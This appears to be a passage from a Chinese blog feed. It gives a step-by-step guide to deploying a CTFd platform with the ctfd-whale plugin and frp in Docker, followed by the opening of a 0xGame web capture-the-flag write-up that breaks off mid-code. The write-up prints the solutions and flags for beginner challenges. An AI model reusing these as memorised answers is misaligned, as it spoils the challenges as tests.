REVERSE_PROXY=true    <span class="token key atrule">volumes</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> .data/CTFd/logs<span class="token punctuation">:</span>/var/log/CTFd      <span class="token punctuation">-</span> .data/CTFd/uploads<span class="token punctuation">:</span>/var/uploads      <span class="token punctuation">-</span> .<span class="token punctuation">:</span>/opt/CTFd<span class="token punctuation">:</span>ro      <span class="token punctuation">-</span> /var/run/docker.sock<span class="token punctuation">:</span>/var/run/docker.sock     <span class="token comment">#这里是添加的</span>    <span class="token key atrule">depends_on</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> db    <span class="token key atrule">networks</span><span class="token punctuation">:</span>        <span class="token key atrule">default</span><span class="token punctuation">:</span>        <span class="token key atrule">internal</span><span class="token punctuation">:</span>        <span class="token key atrule">frp</span><span class="token punctuation">:</span>            <span class="token key atrule">ipv4_address</span><span class="token punctuation">:</span> 172.1.0.2    <span class="token key atrule">cpus</span><span class="token punctuation">:</span> <span class="token string">'1.00'</span>     <span class="token comment">#可改</span>    <span class="token key atrule">mem_limit</span><span class="token punctuation">:</span> 450M     <span class="token comment">#可改</span>  <span class="token key atrule">db</span><span class="token punctuation">:</span>    <span class="token key atrule">image</span><span class="token punctuation">:</span> mariadb<span class="token punctuation">:</span><span class="token number">10.4</span>    <span class="token key atrule">restart</span><span class="token punctuation">:</span> always    <span class="token key atrule">environment</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> MYSQL_ROOT_PASSWORD=ctfd      <span class="token punctuation">-</span> MYSQL_USER=ctfd      <span class="token punctuation">-</span> MYSQL_PASSWORD=ctfd    <span class="token key atrule">volumes</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> .data/mysql<span class="token punctuation">:</span>/var/lib/mysql    <span class="token key atrule">networks</span><span class="token punctuation">:</span>        <span class="token key atrule">internal</span><span class="token punctuation">:</span>    <span class="token comment"># This command is required to set important mariadb defaults</span>    <span class="token key atrule">command</span><span class="token punctuation">:</span> <span class="token punctuation">[</span>mysqld<span class="token punctuation">,</span> <span class="token punctuation">-</span><span class="token punctuation">-</span>character<span class="token punctuation">-</span>set<span class="token punctuation">-</span>server=utf8mb4<span class="token punctuation">,</span> <span class="token punctuation">-</span><span class="token punctuation">-</span>collation<span class="token punctuation">-</span>server=utf8mb4_unicode_ci<span class="token punctuation">,</span> <span class="token punctuation">-</span><span class="token punctuation">-</span>wait_timeout=28800<span class="token punctuation">,</span> <span class="token punctuation">-</span><span class="token punctuation">-</span>log<span class="token punctuation">-</span>warnings=0<span class="token punctuation">]</span>    <span class="token key atrule">cpus</span><span class="token punctuation">:</span> <span class="token string">'1.00'</span>     <span class="token comment">#可改</span>    <span class="token key atrule">mem_limit</span><span class="token punctuation">:</span> 750M     <span class="token comment">#可改</span>  <span class="token key atrule">cache</span><span class="token punctuation">:</span>    <span class="token key atrule">image</span><span class="token punctuation">:</span> redis<span class="token punctuation">:</span><span class="token number">4</span>    <span class="token key atrule">restart</span><span class="token punctuation">:</span> always    <span class="token key atrule">volumes</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> .data/redis<span class="token punctuation">:</span>/data    <span class="token key atrule">networks</span><span class="token punctuation">:</span>        <span class="token key atrule">internal</span><span class="token punctuation">:</span>    <span class="token key atrule">cpus</span><span class="token punctuation">:</span> <span class="token string">'1.00'</span>     <span class="token comment">#可改</span>    <span class="token key atrule">mem_limit</span><span class="token punctuation">:</span> 450M     <span class="token comment">#可改</span>  <span class="token key atrule">frpc</span><span class="token punctuation">:</span>        <span class="token key atrule">image</span><span class="token punctuation">:</span> glzjin/frp<span class="token punctuation">:</span>latest     <span class="token comment">#赵师傅tql</span>    <span class="token key atrule">restart</span><span class="token punctuation">:</span> always    <span class="token key atrule">volumes</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> ./frpc<span class="token punctuation">:</span>/conf/     <span class="token comment">#这里注意</span>    <span class="token key atrule">entrypoint</span><span class="token punctuation">:</span>        <span class="token punctuation">-</span> /usr/local/bin/frpc        <span class="token punctuation">-</span> <span class="token punctuation">-</span>c        <span class="token punctuation">-</span> /conf/frpc.ini    <span class="token key atrule">networks</span><span class="token punctuation">:</span>        <span class="token key atrule">frp</span><span class="token punctuation">:</span>            <span class="token key atrule">ipv4_address</span><span class="token punctuation">:</span> 172.1.0.3  <span class="token comment">#记住此处</span>        <span class="token key atrule">frp-containers</span><span class="token punctuation">:</span>    <span class="token key atrule">cpus</span><span class="token punctuation">:</span> <span class="token string">'1.00'</span>     <span class="token comment">#可改</span>    <span class="token key atrule">mem_limit</span><span class="token punctuation">:</span> 250M     <span class="token comment">#可改</span><span class="token key atrule">networks</span><span class="token punctuation">:</span>    <span class="token key atrule">default</span><span class="token punctuation">:</span>    <span class="token key atrule">internal</span><span class="token punctuation">:</span>        <span class="token key atrule">internal</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>    <span class="token key atrule">frp</span><span class="token punctuation">:</span>        <span class="token key atrule">driver</span><span class="token punctuation">:</span> bridge        <span class="token key atrule">ipam</span><span class="token punctuation">:</span>            <span class="token key atrule">config</span><span class="token punctuation">:</span>                <span class="token punctuation">-</span> <span class="token key atrule">subnet</span><span class="token punctuation">:</span> 172.1.0.0/16    <span class="token key atrule">frp-containers</span><span class="token punctuation">:</span>        <span class="token key atrule">driver</span><span class="token punctuation">:</span> overlay        <span class="token key atrule">internal</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>        <span class="token key atrule">ipam</span><span class="token punctuation">:</span>            <span class="token key atrule">config</span><span class="token punctuation">:</span>                <span class="token punctuation">-</span> <span class="token key atrule">subnet</span><span class="token punctuation">:</span> 172.2.0.0/16</code></pre><p>然后<strong>注意！注意！注意！</strong></p><p>在docker-compose.yml同目录下建nginx文件夹，即与第一个#这里注意相应，然后建<code>http.conf</code>文件写入以下内容</p><p><strong>2021年2月25日更新</strong>目前最新版本的CTFd已经有此配置了，不需要再另加了。</p><p>转载请注明来源：<a href="https://err0r.top/article/CTFD/">https://err0r.top/article/CTFD/</a></p><pre class="language-none"><code class="language-none">worker_processes 4;events &#123;  worker_connections 1024;&#125;http &#123;  # Configuration containing list of application servers  upstream app_servers &#123;    server ctfd:8000;  &#125;  server &#123;    listen 80;    client_max_body_size 4G;    # Handle Server Sent Events for Notifications    location &#x2F;events &#123;      proxy_pass http:&#x2F;&#x2F;app_servers;      proxy_set_header Connection &#39;&#39;;      proxy_http_version 1.1;      chunked_transfer_encoding off;      proxy_buffering off;      proxy_cache off;      proxy_redirect off;      proxy_set_header Host $host;      proxy_set_header X-Real-IP $remote_addr;      proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;      proxy_set_header X-Forwarded-Host $server_name;    &#125;    # Proxy connections to the application servers    location &#x2F; &#123;      proxy_pass http:&#x2F;&#x2F;app_servers;      proxy_redirect off;      proxy_set_header Host $host;      proxy_set_header X-Real-IP $remote_addr;      proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;      proxy_set_header X-Forwarded-Host $server_name;    &#125;  &#125;&#125;</code></pre><p>在docker-compose.yml同目录下建frpc文件夹，即与第二个#这里注意相应，然后进入解压的/frp_0.29.0_linux_amd64文件夹，或直接上传，将</p><pre class="language-none"><code class="language-none">frpcfrpc.inifrpc_full.iniLICENSE</code></pre><p>放入frpc文件夹<br>接着配置frpc.ini，直接上配置</p><pre class="language-none"><code class="language-none">[common]token &#x3D; randommeserver_addr &#x3D; 172.1.0.4server_port &#x3D; 6490     #此处必须与frpc.ini配置一致pool_count &#x3D; 200tls_enable &#x3D; trueadmin_addr &#x3D; 172.1.0.3 #一定要加！！与后面相应admin_port &#x3D; 7400</code></pre><p>此处非常重要，之前本人在这里踩了好多次坑。</p><h3 id="5-配置Dockerfile"><a href="#5-配置Dockerfile" class="headerlink" title="5.配置Dockerfile"></a>5.配置Dockerfile</h3><p>还是直接上配置，<strong>Dockerfile</strong>.注意，最新版本的CTFd已经更换了Dockerfile的写法，可以参考一下apt换源</p><pre class="language-dockerfile" data-language="dockerfile"><code class="language-dockerfile">FROM python:3.7-alpine  #如果出现问题可尝试更换python，一般不需要RUN sed -i &#39;s&#x2F;dl-cdn.alpinelinux.org&#x2F;mirrors.ustc.edu.cn&#x2F;g&#39; &#x2F;etc&#x2F;apk&#x2F;repositories &amp;&amp; \    apk update &amp;&amp; \    apk add linux-headers libffi-dev gcc make musl-dev py-pip mysql-client git openssl-dev   #这里注意1RUN adduser -D -u 1001 -s &#x2F;bin&#x2F;bash ctfdWORKDIR &#x2F;opt&#x2F;CTFdRUN mkdir -p &#x2F;opt&#x2F;CTFd &#x2F;var&#x2F;log&#x2F;CTFd &#x2F;var&#x2F;uploadsCOPY requirements.txt .RUN pip install -r requirements.txt -i https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;pypi&#x2F;web&#x2F;simple&#x2F;   #这里注意2COPY . &#x2F;opt&#x2F;CTFdRUN for d in CTFd&#x2F;plugins&#x2F;*; do \      if [ -f &quot;$d&#x2F;requirements.txt&quot; ]; then \        pip install -r $d&#x2F;requirements.txt -i https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;pypi&#x2F;web&#x2F;simple&#x2F; ; \      fi; \    done; #同样注意2RUN chmod +x &#x2F;opt&#x2F;CTFd&#x2F;docker-entrypoint.shRUN chown -R 1001:1001 &#x2F;opt&#x2F;CTFdRUN chown -R 1001:1001 &#x2F;var&#x2F;log&#x2F;CTFd &#x2F;var&#x2F;uploadsUSER 1001EXPOSE 8000ENTRYPOINT [&quot;&#x2F;opt&#x2F;CTFd&#x2F;docker-entrypoint.sh&quot;]</code></pre><p>注意点：</p><ol><li>第一处的镜像源可百度更换其它源，例如</li></ol><p><code>sed -i &#39;s/dl-cdn.alpinelinux.org/mirrors.tuna.tsinghua.edu.cn/g&#39; /etc/apk/repositories</code><br>注意如果出现问题检查下最后有没有<code>&amp;&amp; \</code></p><ol start="2"><li>python版本一般不需要换</li><li>RUN第三行我将python和python-dev删掉了，如果要加上则会报错<code>python requires by world</code>之类的，请加上<code>python2</code>或<code>python3</code>，<code>python2-dev</code>或<code>python3-dev</code>.即可解决。删掉后没有发现对服务有什么影响</li><li>所有<code>-i &quot;url&quot;</code>都是指定源，如果下载失败则可更换源再试</li><li>第二处注意即我更换了源，因为之前看其他教程下载失败了</li></ol><h3 id="6-准备完毕"><a href="#6-准备完毕" class="headerlink" title="6.准备完毕"></a>6.准备完毕</h3><p>运行<code>docker-compose build</code><br>静待完成</p><img src="/article/CTFD/20201017233234439.png" class="" title="build" loading="lazy"><p>然后运行<code>docker-compose up -d</code></p><img src="/article/CTFD/20201017233300241.png" class="" title="up" loading="lazy"><p>如图所示，有WARNING即为在集群网络类，是正常情况<br>运行<code>docker ps</code>查看容器情况</p><img src="/article/CTFD/20201017233329640.png" class="" title="ps" loading="lazy"><p>访问 <a href="http://ip:8000/">http://ip:8000</a> 即可访问ctfd</p><h3 id="配置CTFD"><a href="#配置CTFD" class="headerlink" title="配置CTFD"></a>配置CTFD</h3><p>进入后随便设置，然后进Admin Panel进行设置</p><table><thead><tr><th>属性</th><th>配置</th></tr></thead><tbody><tr><td>Docker API URL</td><td>unix://var/run/docker.sock</td></tr><tr><td>Frp API IP</td><td>frpc的ip配置</td></tr><tr><td>Frp API Port</td><td>frpc的端口配置</td></tr><tr><td>Frp Http Domain Suffix</td><td>Docker API URL to connect（可填None）</td></tr><tr><td>Frp Http Port</td><td>80</td></tr><tr><td>Frp Direct IP Address</td><td>你的公网ip，本机即为127.0.0.1</td></tr><tr><td>Frp Direct Minimum Port</td><td>与之前frps最小端口呼应</td></tr><tr><td>Frp Direct Minimum Port</td><td>与之前frps最大端口呼应</td></tr><tr><td>Max Container Count</td><td>不超过最大-最小</td></tr><tr><td>Max Renewal Times</td><td>最大实例延时次数</td></tr><tr><td>Frp config template</td><td>填入frps的配置，只需填[common]</td></tr><tr><td>Docker Auto Connect Containers</td><td>ctfd_frpc_1</td></tr><tr><td>Docker Dns Setting</td><td>可填机器内DNS，没有可填个外网DNS</td></tr><tr><td>Docker Swarm Nodes</td><td>linux-1   与前面swarm集群呼应</td></tr><tr><td>Docker Multi-Container Network Subnet</td><td>内网题大子网ip配置/CIDR</td></tr><tr><td>Docker Multi-Container Network Subnet New Prefix</td><td>每个内网题实例的CIDR</td></tr><tr><td>Docker Container Timeout</td><td>单位为秒</td></tr></tbody></table><p>最后附上我的配置图片</p><img src="/article/CTFD/20201017233350699.png" class="" title="配置1" loading="lazy"><img src="/article/CTFD/20201017233413853.png" class="" title="配置2" loading="lazy"><img src="/article/CTFD/20201017233431163.png" class="" title="配置3" loading="lazy"><h3 id="设置docker网络"><a href="#设置docker网络" class="headerlink" title="设置docker网络"></a>设置docker网络</h3><p>这个时候运行<code>docker ps</code><br>发现frpc在无限重启，因为我们还没有配置网络<br>运行<code>docker network ls</code></p><img src="/article/CTFD/20201017234359215.png" class="" title="容器" loading="lazy"><p>显示ctfd_frp-containers</p><p>运行<code>docker network inspect ctfd_frp</code></p><img src="/article/CTFD/20201017234428683.png" class="" title="ctfd_frp" loading="lazy"><p>这个是docker-compose里compose后创建的网络，我们将frps加入此网络，例如我的frp容器id为12345，则运行<code>docker network connect ctfd_frp 12345&lt;即frp容器id&gt;</code>。再运行<code>docker network inspect ctfd_frp</code>，如下<img src="/article/CTFD/20201017234344822.png" class="" title="在这里插入图片描述" loading="lazy"></p><p>这里可以看到ip与我们之前设置的相应。</p><p>此时运行<code>docker restart ctfd_frpc_1 frp_frps_1</code></p><p>然后<code>docker ps</code></p><p>最终如下<img src="/article/CTFD/20201017234457228.png" class="" title="ps" loading="lazy"></p><p>成功完成。</p><p>最后设置道题目选择（我做了汉化）</p><img src="/article/CTFD/20201017233701655.png" class="" title="题目1" loading="lazy"><img src="/article/CTFD/20201017233922648.png" class="" title="题目2" loading="lazy"><img src="/article/CTFD/20201017234241273.png" class="" title="在这里插入图片描述" loading="lazy"><p><code>docker ps</code>里可以看到容器成功启动，地址正常访问</p><h3 id="坑点注意"><a href="#坑点注意" class="headerlink" title="坑点注意"></a>坑点注意</h3><ol><li>如果frpc重复出现retrying，请返回检查docker-compose.yml。找到frpc设置，检查ip设置是否正确。再检查ctfd的Admin Panel里ctfd-whale设置是否正确。</li><li>如果出现安装某个文件失败问题，请更换源，很多都是源里没有指定文件造成的。可以自行访问一下网站，查看一下要下载的文件名，再进行配置。</li><li>似乎docker和系统的版本会有影响，本机为CentOS7.4 64位，腾讯云，docker配置如下</li></ol><img src="/article/CTFD/20201017234315447.png" class="" title="版本" loading="lazy"><ol start="4"><li><p>python的问题，上面提到的，可以删除，是因为没有指定版本的原因，也可以指定版本再下载</p></li><li><p>ctfd运行<code>docker-compose up -d</code>后有可能提示docker-entrypoint.sh没有权限，手动加个权限即可。在CTFd文件夹下运行<code>chmod a+x docker-entrypoint.sh</code>（docker-compose.yml里其实写了加权限，但是最后并没有加上去？）</p></li><li><p>如果docker容器无法启动或者frp端口无法映射可以进容器检查 </p><p>确保docker api填写正确，如docker-compose.yml中写的unix:///var/run/docker.sock<br>你也可以使用端口形式的api如<a href="https://success.docker.com/article/how-do-i-enable-the-remote-api-for-dockerd">官方示例</a>：可以用IP：端口指定API</p><h6 id="docker容器无法启动问题"><a href="#docker容器无法启动问题" class="headerlink" title="docker容器无法启动问题"></a>docker容器无法启动问题</h6><p>进入容器检查：</p><pre class="language-none"><code class="language-none">docker exec -it &lt;ctfd容器id&gt; sh&#x2F;opt&#x2F;CTFd# python&gt;&gt;&gt;import docker&gt;&gt;&gt;client&#x3D;docker.DockerClient(base_url&#x3D;&quot;unix:&#x2F;&#x2F;&#x2F;var&#x2F;run&#x2F;docker.sock&quot;)&gt;&gt;&gt;client.images.list()</code></pre><p> 如果api正确会列出所有镜像 </p><h6 id="frp端口无法映射问题"><a href="#frp端口无法映射问题" class="headerlink" title="frp端口无法映射问题"></a>frp端口无法映射问题</h6><p>进入容器检查：</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F;其实检查可以顺便检查一下上面的，因为都在ctfd容器内docker exec -it &lt;ctfd容器id&gt; sh&#x2F;opt&#x2F;CTFd# python&gt;&gt;&gt;import requests&gt;&gt;&gt;requests.get(&quot;http:&#x2F;&#x2F;172.1.0.3:7400&#x2F;api&#x2F;reload&quot;)&#x2F;&#x2F;即frp api的地址返回&lt;Response [200]&gt; #表示成功</code></pre><p>如果frpc还是出现如下问题</p><pre class="language-none"><code class="language-none">requests.exceptions.ConnectionError: HTTPConnectionPool(host&#x3D;&#39;172.1.0.3&#39;, port&#x3D;7400): Max retries exceeded with url: &#x2F;api&#x2F;reload (Caused by NewConnectionError(&#39;&lt;urllib3.connection.HTTPConnection object at 0x7f8df919f850&gt;: Failed to establish a new connection: [Errno 111] Connection refused&#39;))</code></pre><p>则重新配置frpc。编辑/CTFd/frpc/frpc.ini</p><pre class="language-none"><code class="language-none">[common]token &#x3D; randommeserver_addr &#x3D; 172.1.0.4server_port &#x3D; 6490pool_count &#x3D; 200tls_enable &#x3D; trueadmin_addr &#x3D; 172.1.0.3 #这里千万千万别忘加，之前要被搞气死admin_port &#x3D; 7400</code></pre><p>然后运行<code>docker restart ctfd_frpc_1</code>（这里再看frpc.ini会发现内容更新了，admin配置没了，不用担心）</p><p>再进容器检查<code>requests.get(&quot;http://172.1.0.3:7400/api/reload&quot;)</code>应该就可以了<code>&lt;Response [200]&gt;</code></p></li></ol><ol start="7"><li><p>遇事不决请重启</p></li><li><p>如果发现frp端口冲突，请检查本地frpc或者frps服务，frp是在docker上<strong>不是在本地</strong>的！</p><pre class="language-none"><code class="language-none">systemctl stop frpcsystemctl stop frps</code></pre></li></ol><ol start="9"><li><p>活用查看log</p><pre class="language-none"><code class="language-none">docker logs &lt;ctfd容器id&gt;docker logs &lt;frp容器id&gt;</code></pre></li><li><p>如果修改了任意配置，请跟着修改<strong>系列配置</strong>，很多就是因为漏改造成的</p></li></ol><p>11.docker ps显示正常但是无法访问</p><p> 可以使用 <code>docker logs ctfd_ctfd_1</code> 查看输出，如果发现输出类似： </p><pre class="language-none"><code class="language-none">&#x2F;usr&#x2F;local&#x2F;lib&#x2F;python3.7&#x2F;site-packages&#x2F;tzlocal&#x2F;unix.py:158: UserWarning: Can not find any timezone configuration, defaulting to UTC.  warnings.warn(&#39;Can not find any timezone configuration, defaulting to UTC.&#39;)Starting CTFd&#x2F;usr&#x2F;local&#x2F;lib&#x2F;python3.7&#x2F;importlib&#x2F;_bootstrap.py:219: RuntimeWarning: greenlet.greenlet size changed, may indicate binary incompatibility. Expected 144 from C header, got 152 from PyObject  return f(*args, **kwds)&#x2F;usr&#x2F;local&#x2F;lib&#x2F;python3.7&#x2F;importlib&#x2F;_bootstrap.py:219: RuntimeWarning: greenlet.greenlet size changed, may indicate binary incompatibility. Expected 144 from C header, got 152 from PyObject  return f(*args, **kwds)&#x2F;usr&#x2F;local&#x2F;lib&#x2F;python3.7&#x2F;importlib&#x2F;_bootstrap.py:219: RuntimeWarning: greenlet.greenlet size changed, may indicate binary incompatibility. Expected 144 from C header, got 152 from PyObject  return f(*args, **kwds)[2020-10-11 12:31:30 +0000] [1] [INFO] Starting gunicorn 19.9.0[2020-10-11 12:31:30 +0000] [1] [INFO] Listening at: http:&#x2F;&#x2F;0.0.0.0:8000 (1)[2020-10-11 12:31:30 +0000] [1] [INFO] Using worker: gevent[2020-10-11 12:31:30 +0000] [21] [INFO] Booting worker with pid: 21[2020-10-11 12:31:31 +0000] [23] [INFO] Booting worker with pid: 23[2020-10-11 12:31:32 +0000] [25] [INFO] Booting worker with pid: 25[2020-10-11 12:31:34 +0000] [27] [INFO] Booting worker with pid: 27[2020-10-11 12:31:35 +0000] [29] [INFO] Booting worker with pid: 29[2020-10-11 12:31:36 +0000] [31] [INFO] Booting worker with pid: 31[2020-10-11 12:31:37 +0000] [33] [INFO] Booting worker with pid: 33[2020-10-11 12:31:39 +0000] [35] [INFO] Booting worker with pid: 35[2020-10-11 12:31:40 +0000] [37] [INFO] Booting worker with pid: 37(一直在加)</code></pre><p> 则问题为<a href="https://stackoverflow.com/questions/64105616/greenlet-runtime-error-and-deployed-app-in-docker-keeps-booting-all-the-workers">这篇文章中所提到的问题</a>，只需要删除 <code>requirements.txt</code> 中的 <code>gevent</code> 版本号即可，结果类似下面这样 </p><pre class="language-none"><code class="language-none">&#x2F;requirements.txt...redis&#x3D;&#x3D;3.3.11datafreeze&#x3D;&#x3D;0.1.0geventpython-dotenv&#x3D;&#x3D;0.10.3flask-restplus&#x3D;&#x3D;0.13.0...</code></pre><p> 然后 <code>docker-compose down</code> 再启动 <code>docker-compose up -d --build</code> 不出意外应该就能解决问题 </p><p>(更新)12.出现如下问题可参考<a href="https://github.com/glzjin/CTFd-Whale/issues/20">此issue</a>提出的问题，在ctfd的docker-compose.yml添加<code>/var/run/docker.sock:/var/run/docker.sock</code></p><img src="/article/CTFD/99216164-ee25b080-280f-11eb-95a9-2c2a17895068.png" class="" title="image" loading="lazy"><p>如下</p><img src="/article/CTFD/image-20210225153426310.png" class="" title="image-20210225153426310" loading="lazy"><h2 id="2021-2-25-更新"><a href="#2021-2-25-更新" class="headerlink" title="2021.2.25 更新"></a>2021.2.25 更新</h2><p>最新的CTFd改了部分代码，由于兼容性问题，需要重新编辑一些东西，例如<code>Dockerfile</code></p><pre class="language-dockerfile" data-language="dockerfile"><code class="language-dockerfile">FROM python:3.7-slim-busterWORKDIR &#x2F;opt&#x2F;CTFdRUN mkdir -p &#x2F;opt&#x2F;CTFd &#x2F;var&#x2F;log&#x2F;CTFd &#x2F;var&#x2F;uploads# hadolint ignore&#x3D;DL3008RUN echo &#39;deb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian&#x2F; buster main non-free contrib \ deb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian&#x2F; buster-updates main non-free contrib \ deb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian&#x2F; buster-backports main non-free contrib \ deb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian&#x2F; buster main non-free contrib \ deb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian&#x2F; buster-updates main non-free contrib \ deb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian&#x2F; buster-backports main non-free contrib \ deb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian-security&#x2F; buster&#x2F;updates main non-free contrib \ deb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian-security&#x2F; buster&#x2F;updates main non-free contrib&#39;&gt; &#x2F;etc&#x2F;apt&#x2F;sources.list &amp;&amp; \    apt-get update \    &amp;&amp; apt-get install -y --no-install-recommends \        build-essential \        default-mysql-client \        python3-dev \        libffi-dev \        libssl-dev \        git \    &amp;&amp; apt-get clean \    &amp;&amp; rm -rf &#x2F;var&#x2F;lib&#x2F;apt&#x2F;lists&#x2F;*COPY requirements.txt &#x2F;opt&#x2F;CTFd&#x2F;RUN pip install -r requirements.txt -i http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;pypi&#x2F;simple&#x2F; --no-cache-dirCOPY . &#x2F;opt&#x2F;CTFd# hadolint ignore&#x3D;SC2086RUN for d in CTFd&#x2F;plugins&#x2F;*; do \        if [ -f &quot;$d&#x2F;requirements.txt&quot; ]; then \            pip install -r $d&#x2F;requirements.txt -i http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;pypi&#x2F;simple&#x2F; --no-cache-dir; \        fi; \    done;RUN adduser \    --disabled-login \    -u 1001 \    --gecos &quot;&quot; \    --shell &#x2F;bin&#x2F;bash \    ctfdRUN chmod +x &#x2F;opt&#x2F;CTFd&#x2F;docker-entrypoint.sh \    &amp;&amp; chown -R 1001:1001 &#x2F;opt&#x2F;CTFd &#x2F;var&#x2F;log&#x2F;CTFd &#x2F;var&#x2F;uploadsUSER 1001EXPOSE 8000ENTRYPOINT [&quot;&#x2F;opt&#x2F;CTFd&#x2F;docker-entrypoint.sh&quot;]</code></pre><p>其他pip源</p><pre class="language-none"><code class="language-none">清华：https:&#x2F;&#x2F;pypi.tuna.tsinghua.edu.cn&#x2F;simple&#x2F;中国科技大学 https:&#x2F;&#x2F;pypi.mirrors.ustc.edu.cn&#x2F;simple&#x2F;华中理工大学：http:&#x2F;&#x2F;pypi.hustunique.com&#x2F;山东理工大学：http:&#x2F;&#x2F;pypi.sdutlinux.org&#x2F;豆瓣：http:&#x2F;&#x2F;pypi.douban.com&#x2F;simple&#x2F;</code></pre><img src="/article/CTFD/image-20210225163134408.png" class="" title="image-20210225163134408" loading="lazy"><img src="/article/CTFD/image-20210225163821673.png" class="" title="image-20210225163821673" loading="lazy"><p><strong>我整合了一下CTFd+ctfd-whale+frpc+frps，可以参考一下，<a href="https://github.com/Err0rCM/CTFd_with_CTFd-whale">已上传github</a></strong></p><h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p> <a href="https://www.zhaoj.in/read-6333.html">CTFd-Whale 推荐部署实践</a>(赵师傅官方)</p><p><a href="https://blog.csdn.net/fjh1997/article/details/100850756/">手把手教你如何建立一个支持ctf动态独立靶机的靶场（ctfd+ctfd-whale）</a></p><p> <a href="https://vaala.cat/2020/09/21/ctfd%E4%BD%BF%E7%94%A8ctfd-whale%E5%8A%A8%E6%80%81%E9%9D%B6%E6%9C%BA%E6%8F%92%E4%BB%B6%E6%90%AD%E5%BB%BA%E9%9D%B6%E5%9C%BA%E6%8C%87%E5%8D%97/">ctfd使用ctfd-whale动态靶机插件搭建靶场指南</a></p><p>转载请注明来源：<a href="https://err0r.top/article/CTFD/">https://err0r.top/article/CTFD/</a></p><p>如果有问题请私信联系我，不足之处敬请谅解</p>]]></content>
      
      
      <categories>
          
          <category> 杂谈笔记 </category>
          
          <category> 菜鸡教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFd </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>0XGame WEB Write-up</title>
      <link href="article/0XGame-WEB-Write-up/"/>
      <url>article/0XGame-WEB-Write-up/</url>
      
        <content type="html"><![CDATA[<p>by:gyy</p><h2 id="robots协议"><a href="#robots协议" class="headerlink" title="robots协议"></a>robots协议</h2><h3 id="考察robots协议"><a href="#考察robots协议" class="headerlink" title="考察robots协议"></a>考察robots协议</h3><h4 id="题目地址：http-web-game-0xctf-com-30051"><a href="#题目地址：http-web-game-0xctf-com-30051" class="headerlink" title="题目地址：http://web.game.0xctf.com:30051/"></a>题目地址：<a href="http://web.game.0xctf.com:30051/">http://web.game.0xctf.com:30051/</a></h4><p>知识链接：</p><p>robots是网站跟爬虫间的协议，用简单直接的txt格式文本方式告诉对应的爬虫被允许的权限，也就是说robots.txt是搜索引擎中访问网站的时候要查看的第一个文件。当一个搜索蜘蛛访问一个站点时，它会首先检查该站点根目录下是否存在robots.txt，如果存在，搜索机器人就会按照该文件中的内容来确定访问的范围；如果该文件不存在，所有的搜索蜘蛛将能够访问网站上所有没有被口令保护的页面。</p><p>直接访问./robots.php</p><pre class="language-none"><code class="language-none">User-agent: *Allow: &#x2F;User-agent: CTFerDisallow: &#x2F;flaaaggg.php</code></pre><h3 id="最终"><a href="#最终" class="headerlink" title="最终"></a>最终</h3><p>访问/flaaaggg.php即可</p><p>问题解决：0xGame{now_you_k0nw_robots_Protocol}</p><h2 id="view-source"><a href="#view-source" class="headerlink" title="view_source"></a>view_source</h2><p>考察会不会看源码</p><h3 id="最终-1"><a href="#最终-1" class="headerlink" title="最终"></a>最终</h3><p>f12看源码就行</p><p>问题解决：0xGame{web_sign_in}</p><h2 id="get-amp-post"><a href="#get-amp-post" class="headerlink" title="get&amp;post"></a>get&amp;post</h2><h3 id="考察get与post的应用"><a href="#考察get与post的应用" class="headerlink" title="考察get与post的应用"></a>考察get与post的应用</h3><p>打开直接给代码</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'0xGame'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'X1cT34m'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'0xGame'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'X1cT34m'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'acd666tql'</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token operator">===</span> <span class="token variable">$c</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$b</span> <span class="token operator">===</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span 